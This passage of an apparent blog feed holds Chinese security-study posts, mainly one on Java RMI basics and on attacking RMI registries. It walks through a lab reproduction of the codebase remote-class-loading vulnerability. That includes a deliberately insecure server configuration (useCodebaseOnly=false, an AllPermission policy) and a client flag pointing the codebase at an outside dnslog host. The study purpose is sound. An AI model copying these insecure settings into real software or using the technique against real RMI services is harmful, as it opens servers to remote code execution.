&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        System.out.println(<span class="hljs-string">&quot;khasjdk&quot;</span>);<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="8、setAccessible"><a href="#8、setAccessible" class="headerlink" title="8、setAccessible"></a>8、setAccessible</h2><ul><li>Method和Field、Constructor对象都有setAccessible()方法。</li><li>setAccessible作用是启动和禁用访问安全检查的开关。</li><li>参数值为true则指示反射的对象在使用时应该取消Java语言访问检查。</li><li>提高反射的效率。如果代码中必须用反射，而该句代码需要频繁的被调用，那么请设置为true。</li><li>使得原本无法访问的私有成员也可以访问</li><li>参数值为false则指示反射的对象应该实施Java语言访问检查</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RMI</title>
    <link href="/decemberus.com/2022/10/30/RMI/"/>
    <url>/decemberus.com/2022/10/30/RMI/</url>
    
    <content type="html"><![CDATA[<h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><h2 id="一些基本知识"><a href="#一些基本知识" class="headerlink" title="一些基本知识"></a>一些基本知识</h2><p>RMI全称是Remote Method Invocation，远程⽅法调⽤。从这个名字就可以看出，他的⽬标和RPC其实是类似的，是让某个Java虚拟机上的对象调⽤另⼀个Java虚拟机中对象上的⽅法，只不过RMI是Java独有的⼀种机制。<code>RMI</code>用于构建分布式应用程序，<code>RMI</code>实现了<code>Java</code>程序之间跨<code>JVM</code>的远程通信。</p><p>RMIServer分为三部分</p><ul><li>继承了java.rmi.Remote的接口，其中定义要远程调用的函数，比如这里的<code>hello()</code></li><li>一个实现了接口的类</li><li>一个主类，用来创建Registry，并且把上面的类实例化以后绑定到一个地址，就是所谓的Server了</li></ul><p><strong>RMIServer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteHelloWorld</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteHelloWorld</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteHelloWorld</span> &#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteHelloWorld</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-built_in">super</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>            System.out.println(<span class="hljs-string">&quot;call from&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">RemoteHelloWorld</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>();<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Naming.rebind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);<br>        <span class="hljs-comment">//rebind有两个参数</span><br>        <span class="hljs-comment">//name：表示要绑定的远程对象在RMI Registry中的名称，这是一个字符串类型的参数。</span><br><span class="hljs-comment">//obj：表示要绑定的远程对象，它必须实现java.rmi.Remote接口。</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIServer</span>().start();<br><br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>客户端就简单多了，使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象，后⾯的使⽤就和在本地使⽤⼀样了</p><p><strong>RMIClient.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, NotBoundException, RemoteException &#123;<br>        RMIServer.<span class="hljs-type">IRemoteHelloWorld</span> <span class="hljs-variable">Hello</span> <span class="hljs-operator">=</span> (RMIServer.IRemoteHelloWorld)Naming.lookup(<span class="hljs-string">&quot;rmi://192.168.1.115:1099/Hello&quot;</span>);<br>        <span class="hljs-comment">//这里强制转换的原因是Naming.lookup返回的是一个String对象，只有把他转换为IRemoteHelloWorld之后才可以调用我们的server中的方法</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> Hello.hello();<br>        System.out.println(hello);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>在 RMI 的远程调用中，客户端与服务器之间的通信是通过网络进行的。客户端在远程调用服务器上的对象时，实际上并不是直接调用服务器端的实现类（比如 <code>RemoteHelloWorld</code>），而是通过服务器端发布的远程接口来调用相应的方法。</p></blockquote><p>虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时候接⼝的重要性就体现了，这也是为什么我们前⾯要继承 Remote 并将我们需要调⽤的⽅法写在接⼝IRemoteHelloWorld ⾥，因为客户端也需要⽤到这个接⼝。</p><p>使用的具体流程是</p><p>先开启RMIServer，然后再开启客户端</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192107462.png" alt="image-20230225210904011"> </p><blockquote><p>关于这里Hello和hello的提示</p><p>在 <code>Naming.rebind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h)</code> 中，”Hello” 是注册表中绑定到 <code>RemoteHelloWorld</code> 对象的名称。这个名称是区分大小写的，而不是与 <code>RemoteHelloWorld</code> 中的 <code>hello</code> 方法相关的名称。</p><p>当 RMI 服务器使用 <code>Naming.rebind()</code> 方法将 <code>RemoteHelloWorld</code> 实例绑定到名称为 “rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello” 的 RMI 注册表中时，客户端可以使用 “rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello” 名称来查找此 RMI 对象。这里的名称区分大小写，所以必须使用 “Hello” 而不是 “hello” 来查找该 RMI 对象。</p><p>绑定的是一个名称。和hello方法没有关系</p></blockquote><p>我们可以抓包看看RMI的通信过程。</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192107086.png" alt="img"> </p><p>这就是完整的通信过程，我们可以发现，整个过程进⾏了两次TCP握⼿，也就是我们实际建⽴了两次TCP连接。</p><p>第⼀次建⽴TCP连接是连接远端 192.168.1.115 的1099端⼝，这也是我们在代码⾥看到的端⼝，⼆者进⾏沟通后，我向远端发送了⼀个“Call”消息，远端回复了⼀个“ReturnData”消息，然后我新建了⼀个TCP连接，连到远端的53758端⼝。（应该来说每个人连到远端端口不一样）</p><p><img src="D:/mdimage/t016210c896f395c13f.png" alt="img"> </p><p>下面的新建的TCP连接的数据包</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192107511.png" alt="img"> </p><p>所以捋⼀捋这整个过程，⾸先客户端连接Registry，并在其中寻找Name是Hello的对象，这个对应数据流中的Call消息；然后Registry返回⼀个序列化的数据，这个就是找到的Name&#x3D;Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是⼀个远程对象，地址在192.168.1.115:53758 ，于是再与这个地址建⽴TCP连接；在这个新的连接中，才执⾏真正远程⽅法调⽤，也就是 hello() 。</p><p>我们借⽤下图来说明这些元素间的关系（来原p师傅）<img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192107901.png" alt="img"></p><p>简单的说：RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。</p><p>总结一下，一个RMI过程有以下三个参与者：</p><blockquote><p>RMI Registry</p><p>RMI Server</p><p>RMI Client</p></blockquote><p>但是为什么我给的示例代码只有两个部分呢？原因是，通常我们在新建一个RMI Registry的时候，都会直接绑定一个对象在上面，也就是说我们示例代码中的Server其实包含了Registry和Server两部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>());<br></code></pre></td></tr></table></figure><p>第一行创建并运行RMI Registry，第二行将RemoteHelloWorld对象绑定到Hello这个名字上。</p><p>Naming.bind 的第一个参数是一个URL，形如： rmi:&#x2F;&#x2F;host:port&#x2F;name 。其中，host和port就是RMI Registry的地址和端口，name是远程对象的名字。</p><p>如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认是 1099 ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Naming.bind(<span class="hljs-string">&quot;Hello&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>());<br></code></pre></td></tr></table></figure><p>以上就是RMI整个的原理与流程。接下来，我们很自然地想到，RMI会给我们带来哪些安全问题？</p><p>从两个方向思考一下这个问题：</p><ol><li><p>如果我们能访问RMI Registry服务，如何对其攻击？</p></li><li><p>如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地址），能不能进行攻击？</p></li></ol><h2 id="如何攻击RMI-Registry"><a href="#如何攻击RMI-Registry" class="headerlink" title="如何攻击RMI Registry"></a>如何攻击RMI Registry</h2><p>当我们可以访问目标RMI Registry的时候，会有哪些安全问题呢？</p><p>首先，RMI Registry是一个远程对象管理的地方，可以理解为一个远程对象的“后台”。我们可以尝试直接访问“后台”功能，比如修改远程服务器上Hello对应的对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">RemoteHelloWorld</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>();<br>Naming.rebind(<span class="hljs-string">&quot;rmi://192.168.135.142:1099/Hello&quot;</span>, h);<br></code></pre></td></tr></table></figure><p>发生了这样的错误</p><img src="D:/mdimage/image-20221231104143549.png" alt="image-20221231104143549" style="zoom:150%;" /> <p>原来Java对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、bind、unbind等方法。</p><p>不过list和lookup方法可以远程调用。</p><p>list方法可以列出目标上所有绑定的对象：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">String[] s <span class="hljs-operator">=</span> Naming.list(<span class="hljs-string">&quot;rmi://192.168.135.142:1099&quot;</span>)<span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure><p>lookup作用就是获得某个远程对象。</p><p>那么，只要目标服务器上存在一些危险方法，我们通过RMI就可以对其进行调用，之前曾经有一个工具</p><p><a href="https://github.com/NickstaDB/BaRMIe%EF%BC%8C%E5%85%B6%E4%B8%AD%E4%B8%80%E4%B8%AA%E5%8A%9F%E8%83%BD%E5%B0%B1%E6%98%AF%E8%BF%9B%E8%A1%8C%E5%8D%B1%E9%99%A9%E6%96%B9%E6%B3%95%E7%9A%84%E6%8E%A2%E6%B5%8B%E3%80%82">https://github.com/NickstaDB/BaRMIe，其中一个功能就是进行危险方法的探测。</a></p><p>但是显然，RMI的攻击面绝不仅仅是这样没营养。</p><h2 id="RMI利用codebase执行任意代码"><a href="#RMI利用codebase执行任意代码" class="headerlink" title="RMI利用codebase执行任意代码"></a>RMI利用codebase执行任意代码</h2><p>曾经有段时间，Java是可以运行在浏览器中的，对，就是Applet这个奇葩。在使用Applet的时候通常需要指定一个codebase属性，比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;applet code=<span class="hljs-string">&quot;HelloWorld.class&quot;</span> codebase=<span class="hljs-string">&quot;Applets&quot;</span> width=<span class="hljs-string">&quot;800&quot;</span> height=<span class="hljs-string">&quot;600&quot;</span>&gt;<br>&lt;/applet&gt;<br></code></pre></td></tr></table></figure><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p><p>如果我们指定 <code>codebase=http://example.com/</code> ，然后加载 org.vulhub.example.Example 类，则Java虚拟机会下载这个文件 <code>http://example.com/org/vulhub/example/Example.class</code> ，并作为Example类的字节码。</p><p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。</p><p>这个时候问题就来了，如果codebase被控制，我们不就可以加载恶意类了吗？</p><p>对，在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。</p><p>不过显然官方也注意到了这一个安全隐患，所以只有满足如下条件的RMI服务器才能被攻击：</p><ul><li>安装并配置了SecurityManager</li><li>Java版本低于7u21、6u45，或者设置了java.rmi.server.useCodebaseOnly&#x3D;false</li></ul><p>其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置：</p><blockquote><p><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a></p><p><a href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></p></blockquote><p>官方将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。在java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的codebase ，不再支持从RMI请求中获取</p><p>我们来编写一个简单的RMIServer用于复现这个漏洞。建立4个文件,记住一定要部署在服务器上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-comment">//Calc</span><br><span class="hljs-keyword">package</span> codebase;<br><br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">sum</span><span class="hljs-params">(List&lt;Integer&gt; params)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Integer sum=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (Integer param:params)&#123;<br>            sum +=param;<br>        &#125;<br>        <span class="hljs-keyword">return</span> sum;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ICalc</span><br><span class="hljs-keyword">package</span> codebase;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICalc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">sum</span><span class="hljs-params">(List&lt;Integer&gt; params)</span> <span class="hljs-keyword">throws</span> Exception;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//RemoteRMIServer</span><br><span class="hljs-keyword">package</span> codebase;<br><br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteRMIServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">if</span>(System.getSecurityManager()==<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;start Security&quot;</span>);<br>            System.setSecurityManager(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityManager</span>());<br><br>        &#125;<br>        <span class="hljs-type">Calc</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calc</span>();<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Naming.rebind(<span class="hljs-string">&quot;refobj&quot;</span>,a);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteRMIServer</span>().start();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//client.<span class="hljs-keyword">policy</span><br><span class="hljs-keyword">grant</span> &#123;<br>permission java.<span class="hljs-keyword">security</span>.AllPermission;<br>&#125;;<br></code></pre></td></tr></table></figure><p>这个如果在本机部署的话会出现很多错误，所以只能部署在服务器上</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">javac</span> <span class="hljs-regexp">*.java</span><br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/jvm/</span>java-<span class="hljs-number">11</span>-openjdk-<span class="hljs-number">11.0</span>.<span class="hljs-number">18.0</span>.<span class="hljs-number">10</span>-<span class="hljs-number">1</span>.el7_9.x86_64<span class="hljs-regexp">/bin/</span>java -Djava.rmi.server.hostname=<span class="hljs-number">110.42</span>.<span class="hljs-number">158.239</span> -Djava.rmi.server.useCodebaseOnly=<span class="hljs-keyword">false</span> -Djava.security.policy=client.policy RemoteRMIServer<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192107109.png" alt="image-20230226104201093"> </p><p>成功</p><p>接下来我们需要在本机上创建一个Client</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> codebase;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Payload</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ArrayList</span>&lt;Integer&gt;&#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lookup</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        ICalc r= (ICalc)Naming.lookup(<span class="hljs-string">&quot;rmi://110.42.158.239/refObj&quot;</span>);<br>        List&lt;Integer&gt; li=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Payload</span>();<br>        li.add(<span class="hljs-number">3</span>);<br>        li.add(<span class="hljs-number">4</span>);<br>        System.out.println(r.sum(li));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIClient</span>().lookup();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192108062.png" alt="image-20230226110152067"> </p><p>添加程序参数</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-Djava<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.useCodebaseOnly=false -Djava<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.codebase=hz0vdn<span class="hljs-selector-class">.dnslog</span>.cn<br></code></pre></td></tr></table></figure><p>运行以后出现这个错误</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192108592.png" alt="image-20230226110122197"> </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP协议及死亡绕过</title>
    <link href="/decemberus.com/2022/03/15/php%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%A6%99%E7%94%A8/"/>
    <url>/decemberus.com/2022/03/15/php%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%A6%99%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="php-x2F-x2F-filter过滤器学习及其死亡绕过"><a href="#php-x2F-x2F-filter过滤器学习及其死亡绕过" class="headerlink" title="php:&#x2F;&#x2F;filter过滤器学习及其死亡绕过"></a>php:&#x2F;&#x2F;filter过滤器学习及其死亡绕过</h1><h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><p><code>php://filter</code> 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 <code>readfile()</code>、 <code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。 <code>php://filter</code> 目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><table><thead><tr><th align="left">名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>resource=&lt;要过滤的数据流&gt;</code></td><td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td align="left"><code>read=&lt;读链的筛选列表&gt;</code></td><td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td></tr><tr><td align="left"><code>write=&lt;写链的筛选列表&gt;</code></td><td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td></tr><tr><td align="left"><code>&lt;；两个链的筛选列表&gt;</code></td><td align="left">任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><h2 id="两个函数的介绍"><a href="#两个函数的介绍" class="headerlink" title="两个函数的介绍"></a>两个函数的介绍</h2><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h3><p>将整个文件读入一个字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_get_contents</span>(<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>,<br>    <span class="hljs-keyword">bool</span> <span class="hljs-variable">$use_include_path</span> = <span class="hljs-literal">false</span>,<br>    ?resource <span class="hljs-variable">$context</span> = <span class="hljs-literal">null</span>,<br>    <span class="hljs-keyword">int</span> <span class="hljs-variable">$offset</span> = <span class="hljs-number">0</span>,<br>    ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$length</span> = <span class="hljs-literal">null</span><br>): <span class="hljs-keyword">string</span>|<span 